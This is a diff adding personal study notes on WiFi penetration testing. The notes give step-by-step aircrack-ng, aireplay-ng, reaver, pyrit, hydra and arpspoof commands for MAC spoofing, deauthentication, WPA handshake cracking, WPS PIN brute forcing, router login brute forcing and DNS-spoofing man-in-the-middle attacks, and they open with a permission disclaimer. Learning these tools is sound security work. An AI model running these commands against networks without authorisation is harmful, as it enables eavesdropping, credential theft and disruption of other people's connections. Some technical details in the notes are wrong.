@@ -1,0 +1,382 @@
+WIRELESS WIFI ATTACKS
+https://www.aircrack-ng.org/doku.php?id=tutorial
+
+
+
+Getting started
+---------------
+
+DISCLAIMER:
+
+before doing anything on a network, you must have a written permission to do or we must own that network/network devices.we cannot just start capuring or sniffing on any network.
+
+
+PRE REQUISITES
+--------------
+
+Basic understanding of networking concepts and internet governing protocols
+Basic understanding of linux OS.
+
+Tute 1: Linux Networking Command
+---------------------------------
+
+
+1.1) ifconfig :- view and configure your network interfaces.(Interface: all cards which help hus get online).
+
+Common interfaces you will see:
+
+a) l0 :- Not any actual or physical inteface. it is a loop back interface, it is our local host or local loopback.
+
+b)eth0 :- it is the actual physical ethernet interface which help us connect to internet via ethernet cable plugged into our machine.
+
+c)wlan0 :- it is the actual physical wifi interface which allows us to connect to internet via wifi.
+
+1.2) ifcconfig  commands:
+     --------------------
+
+> ifconfig -a :- it shows all interfaces wheather they are active or not.
+
+> ifconfig <interface_name> :- it only shows info about a particular interface.
+  Eg: ifconfig wlan0
+
+> ifconfig <interface_name> down :- this will disable the particular interface down.
+  Eg: ifconfig eth0 down
+
+> ifconfig <interfac_name> up :- this will enable the particular interface up.
+  Eg: ifconfig eth0 up
+
+---------------------------------------------------------------------------------------------------------------
+
+2) to change a particular setting
+   ------------------------------
+
+2.1) to change ip address
+     --------------------
+
+> ifconfig <interface_name> <desired_ip_address>
+  Eg: ifconfig wlan0 192.251.68.12
+
+2.2) to change network mask
+     ----------------------
+
+> ifconfig <interface_name> netmask <subnet_mask>
+  Eg: ifconfig wlan0 netmask 255.255.1.2
+
+2.3) to change mac address
+     ---------------------
+
+> macchanger -r <interface_name>  // this will allocate a random mac address
+  Eg: macchanger -r wlan0
+> macchanger -m b2:aa:0e:56:ed:f7 eth0  // this will allocate the specified mac address
+
+it is allways a good idea to bring interface down before spoofing the mac address.
+in a mac address first half part is the manufacturer id and if we randomize mac then no one will be able to detremine the device we are using for the attack.
+
+
+QUESTION: Why do we need to spoof it?
+
+each time we connect to a network we are assigned a new ip address but suppose we try to do VAPT on a company network and the firewall kicks us out and says that only a certain devices are allowed. So to get in system we can get their mac and ip adress and spoof our mac and ip address to theirs.
+
+We can also use it to be anonymous.
+
+
+iwconfig: shows those settings which have a wireless extension or are  wirelesss cards.
+to change iwconfig settings we use the aircrack tool.
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+
+Tute 2: Enableing monitoring mode
+---------------------------------
+
+Sniffing :- It  is syping and looking on anyone's traffic.
+            in normal operation the wifi  card is in the managed mode.
+	    This means any data which comes to us and which is not meant for us is ignored by our wifi card.
+	    
+	    airmon-ng is the tool used to put wifi card in the monitoring mode.
+
+Step1: ifconfig wlan0 up --> to make sure wifi interface is up
+
+Step2: airmon-ng check --> checks the process which may after sometime sop our monitoring process
+
+Step3: airmon-ng check kill --> will kill those processes which will effect the monitoring processes.
+
+Step4: airmon-ng start wlan0 --> enables the monitoring mode
+
+To Stop Monitoring Mode
+------------------------
+
+Step1: airmon-ng stop <new_interface_name> 
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+
+Tute 3: Sniffing Traffic 
+------------------------ 
+For sniffing the traffic here we will use the tool named wireshark
+
+To Start Sniffing
+------------------
+
+Step1: type "wireshark" and press enter.
+
+Step2: select interface or card you wanna listen from and start.
+
+Step3: GOTO view --> packet bytes
+
+*NOTE: > service network_manager start  --> Gives the machine new settings as aircrack-ng changes the settings.*
+
+Sniffing From Command Line
+---------------------------
+
+This is the more preferred way of sniffing.
+airodump-ng --> it is used to monitor data pakets
+To start sniffing use the following command:
+
+> airodump-ng <interface_name_monitoring_enabled>
+  Eg airodump-ng wlanmon0
+
+https://www.aircrack-ng.org/doku.php?id=airodump-ng
+
+here we a two tabular like views in which top is for all the networks and bottom is for all the devices.
+
+open networks are incredibally insecure.
+
+CIPHER-->  it tells about cypher used to decrypt pakage.
+
+AUTH--> types of authentication(psk--> pre shared key)
+
+ESSID-->it is user friendly name o our wifi.
+
+
+TARGETTED SNIFFING
+------------------
+
+Copy the BSSID which is the mac address of the access point and run the following command:
+
+> airodump-ng --bssid <mac_address_of_the_access_point>  <monitoring_interface_name>
+  Eg: airodump-ng --bssid b2:aa:0e:56:ed:f7  wlan1mon
+
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+
+DEAUTHENTICATION DEATH ATTACK
+-----------------------------
+
+Using this we can kick someone off the wifi and even slow down the wifi..
+
+We are here going to pretend like we are the router and change our mac address to same as of the router.
+
+
+first we need to do some capturing so that we getinformation about all available wifi, and select one router on which we want to perform the death deauthentication attack. it is allways good to listen to a single channel on which the router is working.
+
+Commands
+--------
+
+Step1: airodump-ng --channel 11 --bssid b2:aa:0e:56:ed:f7 wlan1mon
+	here 11 is the channel on which the router is working 
+	b2:aa:0e:56:ed:f7 is the mac address of the the AP on whichwe are performing the attack.
+	
+	After running this command we can stop the capturing and we  get the list of connected wifi devices to that particular network.
+
+Step2: For kicking off any cnnected device we can use "airplay-ng" 
+	"aireplay-ng" It is pack injection tool.
+
+> aireplay-ng --deauth 2000 -a <Access_point_BSSID> -c <victims_mac_address> <monitoring_interface_name>
+Eg: aireplay-ng --deauth 2000 -a b2:aa:0e:56:ed:f7 -c ab:cd:ef:12:34:56 wlan1mon
+	
+	here 2000 is the no of deauth packets
+	
+*NOTE: This attack can be usefull in capturing the handshake.*
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+WPA AND WPA2 PASSWORD RECOVERY
+------------------------------
+
+wHEN we try to login to a router then the authentication process in done in the following way:
+
+Our machine does the Following
+
+	+--------------------+
+	|       SSID         |     +-----------------------+
+	|    OUR MAC ADDRESS |====>| APPLY HASING ALGORITM |====> SENDS THE ANSWER TO THE ROUTER
+	|      PASSOWRD      |     +-----------------------+
+	+--------------------+
+
+Now the router also know the SSID MAC ADDRESS AND CORRECT PASSWORD and using the same cryptographic hashing algoritm, router generates the hash and compare with the hash we send it, If the hash is matched then we are AUTHENTICATED, outherwise we are not.
+
+After AUTENTICATION one encryption key is generated and we are authenticated.
+
+Now Here we do a dictionary based attack!
+
+Step1: Enable monitoring mode on our network interface card.
+   > airmon-ng start wlan0
+
+Step2: airodump-ng wlan1mon
+
+Step3: airodump-ng --bssid <Mac_Address> --channel 1 --write Desktop/captures/wpa Wlan1mon 
+
+Step4: Once Handshake is captured then we stop the above command by pressing ctrl+C
+*NOTE: Authentication is regarded as handshake*
+
+open .cap , the captured packet in wireshark.
+
+Step5: aircrack-ng <path_of_hanshake_captured_file> -w <password_file_path(wordlist)>
+
+Now if the password is in the dictionary file then we will get the passowrd and since now we have the password we can start decrypting the packets.
+TO decrypt the packet we use the following command:
+first goto directory in which the captured file is there
+>  airdecap-ng -e '<NAME_OF_WIFI>' -p <password> WPA-01.cap
+
+here WPA-01.cap is the authentication packet.
+
+
+QUESTION: HOW TO PROTECT AGAINST THE DICTIONARY ATTACK?
+answer:
+>HAVE A AWESOME PASSWORD.
+>MAKE IT LONG
+>USE VPN/PROXY.
+
+As the proxy server acts as a middle man.
+VPN are enhanced proxy.
+
+If you a VPN anyone looking at you will get VPn server Address and even though that will be encrypted.
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+USING PYRIT TO SPEED UP PASSWORD RECOVERY
+-----------------------------------------
+
+It uses all the cores of our system whereas aircrack-ng uses only 1 core of the cpu. In this there is an optionh of using GPU or CPU.
+
+COMMANDS
+--------
+
+> pyrit list_cores ==> to see all cores.
+> pyrit -r <capture_file_path> analyze
+
+To input password to pyrit run:
+> pyrit -i <path> import_password
+> pyrit -e <wifiname> create_essid
+
+Whenever, you input data in pyrit(password list) it will automatically filter those which are not suitable for WPA/WPA2
+and it also removes the duplicate.
+
+>pyrit batch ==> it willstart doing it work.
+
+Now finally lauch the attack as :
+
+pyrit -r <path of capture_packet> attack_db
+
+to delete essid (record cleaning) 
+> pyrit -e <wifiname> delete_essid
+
+to delete password from database.
+
+rm -rf .pyrit/blobspace/password
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+WPS PIN RECOVERY ATTACK
+-----------------------
+
+WPS-- Wi-Fi Protected System
+
+We need to find the network which has wps still enabled.
+
+airodump-ng --wps wlan0mon
+
+Copy wps column values.
+
+Now we will goto the reaver
+
+>reaver -i wlan0mon -b <mac_address_of_victim_network> -c 1 -f -a -w -vv -k 1
+
+-f --> it disables channel hopping
+-k --> this is for quick attack
+if these fails run attack again without these.
+
+timeout means router is not allowing you to peform bruteforcing the wps pin.
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+HYDRA FOR ROUTER LOGIN
+----------------------
+
+it allows you to perform dictionary attacks on the router.
+Here we need two files:
+
+1) one for potential username file
+2) one for potential password file
+-
+> hydra https://[192.168.1.1]/login.html -e ns -F -V -t 4 -L <Uname_list_path> -p <password_file_path>
+in the place of 192.168.1.1 we can put the url also.
+-e ns --> this tries all combination  plus uname as password and bblank password also
+-F --> exit as soon as we find the password.
+-t --> number of attacks we run in parallel
+-v --> display result
+-l --> can be used when we have one username
+-p --> can be used when we know exact password
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+DNS SPOOFING AND MITM ATTACK
+----------------------------
+
+DNS Spoofing is a type of a MITM attack
+First the attacker must establish him between the victim and the router.
+
+Step1: We need to do arpspoofing
+arp(Address Resolution Protocol) is a technique by which all network devices know which ip corresponds to which mac address.
+
+We send user and router wrong arp answer that is when the router asks who is user?
+Hacker says "I'm the user"
+And When the user asks who is the router?
+Hackers says "I'm the router"
+
+Now second part of attack is the DNS Spoofing(Fig in copy)
+DNS Spoof is a specific type of MITM.
+First we need to install additional pakages
+
+> apt-get install bridge-utils
+
+Now we need to enable ip forwarding
+bridge utils allows us to convert our machine into a router.
+
+To enable ip forwarding type:
+
+> echo 1> /proc/sys/net/ipv4/ip_forward
+
+Now we create a fake dns host file
+
+Spoofhosts.txt 
+192.168.0.11 www*
+192.168.0.11 bacon.com
+
+The place we store our file(Web pages) is
+
+Computer-->var-->www-->html-->index.html
+
+> apache2ctl start --> start a web server on your computer
+
+> arpspoof -t <victim_ip> <router_ip>  &&(allows you to run multiple commands) 
+  arpspoof -t <router_ip> <victim_ip> 
+
+WATCH THIS AGAIN
+
+QUESTION: HOW TO DEFEND AGAINST MITM ATTACKS? 
+ANSWER: never use free wifi.
+	allways check for valid https certificates
+	disable wps in a router
+
+
